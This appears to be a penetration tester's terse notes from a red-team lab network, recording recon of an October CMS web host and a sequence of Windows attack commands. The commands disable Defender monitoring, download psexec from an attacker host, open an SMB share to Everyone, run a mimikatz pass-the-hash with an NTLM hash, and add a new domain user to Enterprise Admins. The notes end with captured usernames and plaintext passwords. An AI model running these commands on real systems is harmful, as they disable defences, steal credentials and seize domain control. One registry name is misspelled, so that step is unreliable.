# stuff

### Web 10.200.118.13

only 22,80 open
contact us form sends a post request
/october/themes and /october/modules -> information disclosure

#### vulns
php upload and rce in http://10.200.118.13/october/storage/app/media/ using php5 ext but need auth

Set-MpPreference -DisableRealtimeMonitoring $true

Invoke-WebRequest -Uri "http://10.200.118.22:8888/psexec64.exe" -OutFile psexec.exe 

New-SMBShare -name "share" -path "C:\Users\zeeshan\Downloads" | Grant-SmbShareAccess -AccountName Everyone -AccessRight Full

sekurlsa::pth /user:Administrator /domain:corp.thereserve.loc /ntlm:d3d4edcc015856e386074795aea86b3e /run:"mstsc.exe /restrictedadmin"

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestricedAdmin" -Value "0" -PropertyType DWORD -Force

$password = ConvertTo-SecureString "Password123" -AsPlaintext -Force
New-ADUser -Name zeeshan -AccountPassword $password -Enabled $true -Passwordneverexpires $true 
$User = Get-ADUser -Identity zeeshan # -Server "corpdc.corp.thereverse.loc" 
$Group = Get-ADGroup -Identity "Enterprise Admins" -Server "rootdc.thereverse.loc"
Add-ADGroupMember -Identity $Group -Members $User -Server "rootdc.thereverse.loc"

### captureres 
a.barker
c.young:Password!
g.watson
s.harding
t.buckley

### approvers
a.holt:willnotguessthis1@
a.turner
r.davies
s.kemp

0800e1fc-1d0d-49e4-b479-7083bf726cad
